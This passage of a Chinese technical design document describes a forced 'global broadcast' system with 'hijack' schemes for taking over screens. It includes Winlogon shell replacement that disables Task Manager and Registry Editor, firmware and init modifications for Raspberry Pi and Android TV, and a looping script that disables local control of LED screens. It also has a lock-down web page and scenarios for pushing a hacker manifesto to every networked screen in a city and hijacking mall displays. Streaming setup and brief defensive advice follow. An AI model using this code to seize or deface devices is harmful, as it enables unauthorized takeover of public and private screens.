mount -t devtmpfs none /dev

# 启动最小化X服务器
xinit /usr/local/bin/kiosk_broadcast.sh -- :0 vt1 &

# 防止用户切换TTY
for i in {1..6}; do
  openvt -c $i -s -- /bin/sh -c 'while true; do echo "系统处于紧急广播模式"; sleep 1; done'
done

# 进入死循环，防止init退出
while true; do sleep 3600; done
```

#### 2. Windows引导劫持（Winlogon替换）

**注册表修改**:
```powershell
# 替换Windows Shell为广播程序
$RegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
Set-ItemProperty -Path $RegPath -Name "Shell" -Value "C:\Broadcast\kiosk.exe"

# 禁用任务管理器
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" `
                 -Name "DisableTaskMgr" -Value 1

# 禁用注册表编辑器
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" `
                 -Name "DisableRegistryTools" -Value 1
```

**C# Kiosk程序** (`kiosk.exe`):
```csharp
using System;
using System.Windows.Forms;

namespace BroadcastKiosk {
    static class Program {
        [STAThread]
        static void Main() {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            var form = new Form();
            form.FormBorderStyle = FormBorderStyle.None;
            form.WindowState = FormWindowState.Maximized;
            form.TopMost = true;

            var browser = new WebBrowser();
            browser.Dock = DockStyle.Fill;
            browser.Url = new Uri("http://broadcast.example.com/emergency");
            browser.ScriptErrorsSuppressed = true;
            browser.IsWebBrowserContextMenuEnabled = false;
            browser.WebBrowserShortcutsEnabled = false;

            form.Controls.Add(browser);

            // 禁用Alt+F4和所有快捷键
            form.KeyPreview = true;
            form.KeyDown += (s, e) => { e.Handled = true; };

            Application.Run(form);
        }
    }
}
```

---

### 方案四：固件级劫持（最深入）

**适用场景**：嵌入式设备、智能电视、公共LED屏

#### 1. Raspberry Pi固件修改

```bash
# /boot/config.txt - 修改启动配置
disable_splash=1
boot_delay=0
avoid_warnings=1

# /boot/cmdline.txt - 添加启动参数
console=tty3 loglevel=0 logo.nologo quiet splash init=/usr/local/bin/broadcast_init.sh
```

**最小化启动脚本**:
```bash
#!/bin/bash
# 跳过systemd，直接启动广播显示

mount -a
ip link set eth0 up
udhcpc -i eth0

# 启动framebuffer显示
fbi -T 1 -noverbose -a /broadcast/emergency.png

# 或启动最小化浏览器
startx /usr/bin/chromium-browser --kiosk http://broadcast.local/emergency -- :0 vt1
```

#### 2. Android TV固件修改（需要root）

```bash
# 修改系统启动动画
adb root
adb remount
adb push emergency_bootanimation.zip /system/media/bootanimation.zip

# 修改Launcher为广播应用
adb shell pm disable-user --user 0 com.google.android.tvlauncher
adb shell pm enable com.example.broadcastkiosk
adb shell pm set-home-activity com.example.broadcastkiosk/.BroadcastKioskActivity

# 禁用系统更新
adb shell pm disable-user --user 0 com.google.android.gms
```

#### 3. 商用LED屏控制（RS232/网络协议）

```python
# led_hijack.py - 通过控制协议劫持LED屏显示
import serial
import time

def hijack_led_screen(port='/dev/ttyUSB0', baudrate=9600):
    """通过串口发送控制指令，强制显示广播内容"""
    ser = serial.Serial(port, baudrate, timeout=1)

    # 常见LED屏控制协议（Linsn/Novastar）
    commands = [
        b'\x55\xAA\x00\xFF',  # 唤醒屏幕
        b'\x55\xAA\x11\x01',  # 切换到外部输入
        b'\x55\xAA\x22\x05',  # 设置亮度最大
        b'\x55\xAA\x33\x00',  # 禁用本地控制
    ]

    for cmd in commands:
        ser.write(cmd)
        time.sleep(0.1)

    # 发送图像数据（假设使用HTTP协议推送）
    import requests
    requests.post('http://led-screen-ip/api/display',
                 files={'image': open('emergency.png', 'rb')})

    ser.close()

# 持续监控并劫持
while True:
    hijack_led_screen()
    time.sleep(60)
```

---

### 一图流广播页面（HTML）

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>紧急广播</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      overflow: hidden;
    }

    body {
      background: #000;
      width: 100vw;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    #broadcast-image {
      max-width: 100vw;
      max-height: 100vh;
      object-fit: contain;
      pointer-events: none;  /* 禁用鼠标交互 */
      user-select: none;     /* 禁用选择 */
    }

    /* 防止右键菜单 */
    body {
      -webkit-touch-callout: none;
      -webkit-user-select: none;
      -khtml-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
    }
  </style>
</head>
<body>
  <img id="broadcast-image" src="/broadcast/emergency.png" alt="Emergency Broadcast">

  <script>
    // 禁用所有键盘操作
    document.addEventListener('keydown', (e) => {
      e.preventDefault();
      e.stopPropagation();
      return false;
    });

    // 禁用右键菜单
    document.addEventListener('contextmenu', (e) => {
      e.preventDefault();
      return false;
    });

    // 禁用F5刷新
    document.addEventListener('keydown', (e) => {
      if (e.key === 'F5' || (e.ctrlKey && e.key === 'r')) {
        e.preventDefault();
      }
    });

    // 防止退出全屏
    setInterval(() => {
      if (!document.fullscreenElement) {
        document.documentElement.requestFullscreen();
      }
    }, 1000);

    // 自动进入全屏
    window.addEventListener('load', () => {
      document.documentElement.requestFullscreen();
    });

    // 防止页面跳转
    window.addEventListener('beforeunload', (e) => {
      e.preventDefault();
      e.returnValue = '';
    });

    // 定期检查并重新加载图片（防止缓存）
    setInterval(() => {
      const img = document.getElementById('broadcast-image');
      img.src = '/broadcast/emergency.png?t=' + Date.now();
    }, 10000);
  </script>
</body>
</html>
```

---

### API端点：一图流广播

```python
from flask import Flask, send_file, jsonify
import os

app = Flask(__name__)

BROADCAST_IMAGE = "/var/broadcast/current.png"

@app.route('/api/broadcast/one-image/set', methods=['POST'])
def set_broadcast_image():
    """设置一图流广播图片"""
    if 'image' not in request.files:
        return jsonify({"error": "未提供图片"}), 400

    file = request.files['image']
    file.save(BROADCAST_IMAGE)

    # 触发所有客户端刷新
    socketio.emit('force_action', {'action': 'reload'}, broadcast=True)

    return jsonify({
        "success": True,
        "message": "一图流广播已激活",
        "image_url": "/broadcast/emergency.png"
    })

@app.route('/broadcast/emergency.png')
def get_broadcast_image():
    """获取当前广播图片"""
    if os.path.exists(BROADCAST_IMAGE):
        return send_file(BROADCAST_IMAGE, mimetype='image/png')
    else:
        # 返回默认图片
        return send_file('/var/broadcast/default.png', mimetype='image/png')

@app.route('/api/broadcast/one-image/activate', methods=['POST'])
def activate_one_image_broadcast():
    """激活一图流强制广播"""
    data = request.json

    # 创建广播记录
    broadcast = {
        "broadcast_id": f"oneimage_{int(time.time())}",
        "type": "one_image",
        "level": 3,  # 最高级，重启无效
        "image_url": data.get('image_url', '/broadcast/emergency.png'),
        "message": data.get('message', '系统处于紧急广播模式'),
        "duration": data.get('duration', 0),  # 0表示无限期
        "started_at": time.time()
    }

    # 推送到所有客户端
    socketio.emit('broadcast_one_image', broadcast, broadcast=True)

    return jsonify({
        "success": True,
        "broadcast": broadcast,
        "message": "一图流强制广播已激活，所有设备将显示指定图片"
    })
```

---

### 典型应用场景

#### 场景1：黑客宣言（动漫经典）
```bash
# 上传宣言图片
curl -X POST http://broadcast.local/api/broadcast/one-image/set \
  -F "image=@hacker_manifesto.png"

# 激活全网广播
curl -X POST http://broadcast.local/api/broadcast/one-image/activate \
  -H "Content-Type: application/json" \
  -d '{
    "message": "We are Anonymous. We are Legion. We do not forgive.",
    "duration": 0
  }'
```

**效果**：全城所有联网屏幕显示黑客宣言图片，重启无效。

#### 场景2：政府紧急通知
```bash
curl -X POST http://broadcast.gov/api/broadcast/one-image/activate \
  -d '{
    "image_url": "/emergency/evacuation_notice.png",
    "message": "紧急疏散通知：所有人员立即前往指定避难所",
    "level": 3
  }'
```

#### 场景3：商城广告劫持
```python
# 劫持商城所有LED屏显示促销广告
import requests

for screen_ip in ["192.168.1.101", "192.168.1.102", "192.168.1.103"]:
    requests.post(f"http://{screen_ip}/api/display/hijack", json={
        "image_url": "http://broadcast.local/ads/black_friday.png",
        "duration": 3600  # 1小时
    })
```

---

### 防护建议（如何抵抗一图流劫持）

1. **网络隔离**：关键设备使用独立网络，避免DNS/HTTP劫持
2. **固件签名验证**：启用Secure Boot，防止引导劫持
3. **设备管理权限控制**：不授予第三方应用设备管理员权限
4. **定期安全审计**：检查系统启动项、网络配置
5. **物理访问控制**：公共设备加锁，防止USB/串口攻击

---

## 🚀 部署方案

### 方案一：自建流媒体服务器

#### 1. 安装 nginx + rtmp 模块

```bash
# Ubuntu/Debian
sudo apt update
sudo apt install -y build-essential libpcre3 libpcre3-dev libssl-dev zlib1g-dev

# 下载nginx和rtmp模块
cd /tmp
wget http://nginx.org/download/nginx-1.24.0.tar.gz
git clone https://github.com/arut/nginx-rtmp-module.git

# 编译安装
tar -zxvf nginx-1.24.0.tar.gz
cd nginx-1.24.0
./configure --with-http_ssl_module --add-module=../nginx-rtmp-module
make
sudo make install
```

#### 2. 配置 nginx.conf

```nginx
# /usr/local/nginx/conf/nginx.conf

worker_processes auto;
events {
    worker_connections 1024;
}

# RTMP 推流配置
rtmp {
    server {
        listen 1935;
        chunk_size 4096;

        application live {
            live on;
            record off;

            # 推流认证
            on_publish http://localhost:5000/api/broadcast/auth;

            # HLS 输出
            hls on;
            hls_path /var/media/hls;
            hls_fragment 3s;
            hls_playlist_length 60s;

            # 录制
            record all;
            record_path /var/media/broadcasts;
            record_suffix _%Y%m%d_%H%M%S.mp4;
        }
    }
}

# HTTP 服务器
http {
    server {
        listen 8080;

        # HLS 文件分发
        location /hls {
            types {
                application/vnd.apple.mpegurl m3u8;
                video/mp2t ts;
            }
            root /var/media;
            add_header Cache-Control no-cache;
            add_header Access-Control-Allow-Origin *;
        }

        # 广播录像下载
        location /broadcasts {
            alias /var/media/broadcasts;
            add_header Access-Control-Allow-Origin *;
        }
    }
}
```

#### 3. 创建媒体目录

```bash
sudo mkdir -p /var/media/hls
sudo mkdir -p /var/media/broadcasts
sudo chown -R www-data:www-data /var/media
```

#### 4. 启动 nginx

```bash
sudo /usr/local/nginx/sbin/nginx
```

---

### 方案二：使用 SRS 流媒体服务器

```bash
# Docker 部署 SRS
docker run -d \
  --name srs \
  -p 1935:1935 \
  -p 1985:1985 \
  -p 8080:8080 \
  -v /var/media:/usr/local/srs/objs/nginx/html \
  ossrs/srs:5
```

**SRS 配置** (`srs.conf`):
```conf
listen              1935;
max_connections     1000;
daemon              off;

http_server {
    enabled         on;
    listen          8080;
    dir             ./objs/nginx/html;
}

vhost __defaultVhost__ {
    hls {
        enabled         on;
        hls_path        /var/media/hls;
        hls_fragment    3;
        hls_window      60;
    }

    http_remux {
        enabled     on;
        mount       [vhost]/[app]/[stream].flv;
    }
}
```

---

### 方案三：使用云服务（推荐生产环境）

#### Cloudflare Stream

```python
import requests

# 上传视频到 Cloudflare Stream
def upload_to_cloudflare_stream(video_file):
    url = f"https://api.cloudflare.com/client/v4/accounts/{ACCOUNT_ID}/stream"
    headers = {
        "Authorization": f"Bearer {API_TOKEN}"
    }
    files = {
        "file": open(video_file, "rb")
    }

    response = requests.post(url, headers=headers, files=files)
    data = response.json()

    return data['result']['playback']['hls']  # HLS URL
```

#### AWS CloudFront + MediaLive

```bash
# 使用 AWS CLI 创建 MediaLive 频道
aws medialive create-channel \
  --name "global-broadcast" \
  --role-arn "arn:aws:iam::ACCOUNT:role/MediaLiveRole" \
  --input-attachments InputId=input-123 \
  --destinations Id=dest1,Url=s3://bucket/live/
```

---

## 🎬 推流操作指南

### 使用 OBS Studio 推流

1. **打开 OBS Studio**
2. **设置 → 推流**:
   - 服务: 自定义
   - 服务器: `rtmp://server:1935/live`
   - 串流密钥: `emergency?key=YOUR_STREAM_KEY`
3. **来源**:
   - 添加"显示器采集"（屏幕直播）
   - 添加"视频采集设备"（摄像头）
   - 添加"文本"（紧急通知文字）
4. **开始推流**

---

### 使用 FFmpeg 推流

#### 推流文件

```bash
ffmpeg -re -i video.mp4 \
  -c:v libx264 -preset veryfast -b:v 2500k \
  -c:a aac -b:a 128k \
  -f flv rtmp://server:1935/live/emergency?key=YOUR_KEY
```

#### 推流屏幕

```bash
# Linux (X11)
ffmpeg -f x11grab -s 1920x1080 -i :0.0 \
  -c:v libx264 -preset ultrafast -b:v 3000k \
  -f flv rtmp://server:1935/live/screen?key=YOUR_KEY

# macOS
ffmpeg -f avfoundation -i "1:0" \
  -c:v libx264 -preset ultrafast -b:v 3000k \
  -f flv rtmp://server:1935/live/screen?key=YOUR_KEY

# Windows
ffmpeg -f gdigrab -i desktop \
  -c:v libx264 -preset ultrafast -b:v 3000k \
  -f flv rtmp://server:1935/live/screen?key=YOUR_KEY
```

#### 推流摄像头

```bash
# Linux
ffmpeg -f v4l2 -i /dev/video0 \
  -c:v libx264 -preset ultrafast -b:v 2000k \
  -f flv rtmp://server:1935/live/camera?key=YOUR_KEY

# macOS
ffmpeg -f avfoundation -i "0" \
  -c:v libx264 -preset ultrafast -b:v 2000k \
  -f flv rtmp://server:1935/live/camera?key=YOUR_KEY
```

#### TTS 文字转语音推流

```python
import pyttsx3
import subprocess

def text_to_broadcast(text, stream_key):
    # 生成TTS音频
    engine = pyttsx3.init()
    engine.save_to_file(text, '/tmp/tts.mp3')
    engine.runAndWait()

    # 创建带文字的视频
    subprocess.run([
        'ffmpeg', '-loop', '1', '-i', 'background.png',
        '-i', '/tmp/tts.mp3',
        '-c:v', 'libx264', '-tune', 'stillimage',
        '-c:a', 'aac', '-b:a', '128k',
        '-shortest',
        '-f', 'flv',
        f'rtmp://server:1935/live/tts?key={stream_key}'
    ])

# 使用
text_to_broadcast("这是一条紧急广播消息", "YOUR_STREAM_KEY")
```

---

## 🔐 安全考虑

### 1. 推流认证

```python
from flask import request, jsonify
import hashlib
import time

@app.route('/api/broadcast/auth', methods=['POST'])
def authenticate_stream():
    """RTMP推流认证"""
    stream_name = request.form.get('name')
    stream_key = request.args.get('key')

    # 验证stream_key
    expected_key = hashlib.sha256(
        f"{stream_name}:{STREAM_SECRET}:{int(time.time() / 3600)}"
    ).hexdigest()[:16]

    if stream_key != expected_key:
        return '', 403  # 拒绝推流

    return '', 200  # 允许推流
```

### 2. 客户端访问控制

```python
@app.route('/api/broadcast/client/register', methods=['POST'])
def register_client():
    """客户端注册（获取观看权限）"""
    data = request.json

    # 验证客户端身份
    client_token = validate_client_token(data.get('token'))
    if not client_token:
        return jsonify({"error": "未授权"}), 401

    # 生成临时观看凭证
    watch_token = generate_watch_token(client_token['client_id'])

    return jsonify({
        "success": True,
        "watch_token": watch_token,
        "expires_in": 3600
    })
```

### 3. HLS 加密（可选）

```bash
# 生成AES-128密钥
openssl rand 16 > enc.key

# FFmpeg HLS加密推流
ffmpeg -i input.mp4 \
  -c:v libx264 -c:a aac \
  -hls_time 10 \
  -hls_key_info_file keyinfo.txt \
  -hls_playlist_type event \
  output.m3u8
```

**keyinfo.txt**:
```
http://server/keys/enc.key
/path/to/enc.key
$(openssl rand -hex 16)
```

### 4. 防止 DDoS

```nginx
# nginx 限流配置
http {
    limit_req_zone $binary_remote_addr zone=hls:10m rate=10r/s;

    server {
        location /hls {
            limit_req zone=hls burst=20;
            # ...
        }
    }
}
```

---

## 📊 与 FAIRY 右屏对比

| 特性 | FAIRY 右屏 | 全球广播系统 |
|------|-----------|-------------|
| **广播范围** | 单机（本地浏览器） | 全球（所有连接设备） |
| **内容类型** | 文字告警 + JSON数据 | 视频/音频/图文 |
| **推送方式** | 本地轮询 | WebSocket实时推送 |
| **延迟** | <1秒 | 3-10秒（HLS） / <1秒（WebRTC） |
| **带宽需求** | 极低（<1KB/s） | 中高（500KB/s - 5MB/s） |
| **客户端控制** | 无（用户完全控制） | 强制播放（Level 3不可关闭） |
| **适用场景** | 单人运维监控 | 大规模紧急通知/直播 |
| **基础设施** | Flask本地API | 流媒体服务器 + CDN |

**FAIRY 右屏实现 → 全球广播的进化路径**:
```
FAIRY 右屏告警系统
  └─ 本地Flask API (/api/alerts)
     └─ 前端轮询刷新
        └─ 显示JSON数据

            ↓ 扩展为全球广播

全球广播系统
  └─ 流媒体服务器 (nginx-rtmp / SRS)
     └─ WebSocket实时推送 (Socket.IO)
        └─ 强制视频播放 (HLS/WebRTC)
           └─ CDN全球分发
              └─ 5万+客户端同时观看
```

---

## 🎯 实施步骤

### 阶段一：基础设施搭建（1-2天）

1. ✅ 部署 nginx + rtmp 模块
2. ✅ 配置 HLS 输出
3. ✅ 测试 OBS/FFmpeg 推流
4. ✅ 验证 HLS 播放

### 阶段二：后端 API 开发（2-3天）

1. ✅ Flask 广播管理 API
2. ✅ WebSocket 推送通知 (Socket.IO)
3. ✅ 客户端会话管理（Redis）
4. ✅ 广播历史记录存储（PostgreSQL）
5. ✅ TTS 文字转语音功能

### 阶段三：前端播放器（1-2天）

1. ✅ Video.js 播放器集成
2. ✅ 全屏强制播放逻辑
3. ✅ 权限等级控制
4. ✅ 断线自动重连
5. ✅ 播放质量监控

### 阶段四：FAIRY 集成（1天）

1. ✅ 在 FAIRY-DESK 添加广播控制面板
2. ✅ 右屏告警触发全球广播（高级别告警自动转为Level 3广播）
3. ✅ 统一管理界面

### 阶段五：测试与优化（2-3天）

1. ✅ 负载测试（模拟5万+客户端）
2. ✅ 延迟优化（HLS → WebRTC）
3. ✅ CDN 配置（全球加速）
4. ✅ 安全审计

---

## 📝 TODO

- [ ] 搭建 nginx-rtmp 流媒体服务器
- [ ] 实现广播管理 Flask API
- [ ] 开发前端全屏播放器
- [ ] 集成 WebSocket 实时推送
- [ ] 实现 TTS 文字转语音广播
- [ ] 添加推流认证机制
- [ ] 配置 CDN 全球分发（可选）
- [ ] 集成到 FAIRY-DESK 右屏
- [ ] 负载测试和性能优化

---

## 🎬 使用示例

### 发起紧急广播

```bash
curl -X POST http://localhost:5000/api/broadcast/emergency \
  -H "Content-Type: application/json" \
  -d '{
    "message": "检测到网络攻击，所有系统进入防御模式",
    "type": "security_alert",
    "duration": 300
  }'
```

### 推流视频文件

```bash
ffmpeg -re -i alert.mp4 \
  -c copy \
  -f flv rtmp://server:1935/live/emergency?key=YOUR_KEY
```

### 查看在线客户端

```bash
curl http://localhost:5000/api/broadcast/clients?status=playing
```

---

**总结**：全球实时广播系统是 FAIRY-DESK 右屏告警系统的全球化扩展，通过流媒体技术实现了从单机监控到全球广播的进化。核心技术栈为 **nginx-rtmp + HLS + WebSocket + Video.js**，支持多级别权限控制和强制播放机制。
